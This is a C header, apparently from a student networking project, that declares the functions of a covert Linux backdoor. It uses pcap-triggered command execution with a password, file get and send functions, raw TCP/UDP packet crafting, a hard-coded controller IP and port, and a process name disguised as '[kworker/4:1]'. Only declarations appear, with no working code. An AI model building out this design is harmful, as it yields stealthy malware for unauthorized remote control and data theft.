/*---------------------------------------------------------------------------------------
--      Source File:            backdoor.c
--
--      Functions:              main()
--								int startPacketCap();
--								void packetRecieved(u_char*, const struct pcap_pkthdr*, const u_char*);
--								int acceptCommand(int, unsigned long);
--								void usage (char **argv);
--
--      Date:                   October 6, 2014
--
--      Revisions:              (Date and Description)
--                                      
--      Designer:               Cole Rees and David Tran
--                              
--      Programmer:             Cole Rees and David Tran
--
--		This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor 
-- 		on a Linux machine that will take command line commands from an external controller and then 
-- 		return the results to the controller. The backdoor will only respond to the controller that 
-- 		supplies it with the correct password.
--
--
--      To compile the application:
--                      
--            	make clean
--				make
-- 
--	To run the application:
--	
--		./backdoor
--
---------------------------------------------------------------------------------------*/
#ifndef BACKDOOR_H
#define BACKDOOR_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h> 	// TCP Header definitions
#include <netinet/udp.h>   	// UDP Header definitions
#include <netinet/ip.h>    	// IP Header definitions
#include <sys/types.h>
#include <unistd.h>
#include <netinet/if_ether.h> 
#include <sys/inotify.h>
#include <signal.h>
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/prctl.h>
#include "helperFunctions.h"
#include <limits.h>
#include <libgen.h>

#define TRUE 1
#define FALSE 0
#define EVENT_SIZE (sizeof (struct inotify_event))
#define BUF_LEN	(1024 * (EVENT_SIZE + 16))
#define SIZE_ETHERNET 14
#define MASK "[kworker/4:1]"
#define FILTER_IP "192.168.179.131"
#define FILTER_PORT "10022"
#define SEND_PACKET_TYPE "UDP"

static volatile sig_atomic_t doneflag = FALSE;

int startPacketCap();
void packetRecieved(u_char*, const struct pcap_pkthdr*, const u_char*);
int runCommandLineArg(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command);
int getFile(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command);
int createTCPSocket();
int createUDPSocket();
char *createTCPPacket(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *);
char *createUDPPacket(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *);
unsigned short in_cksum(unsigned short *, int);
int sendFile(int sourcePort, unsigned long sourceIp, int destPort, unsigned long destIp, char *command);
void print_mask(int);
void usage (char **argv);
#endif

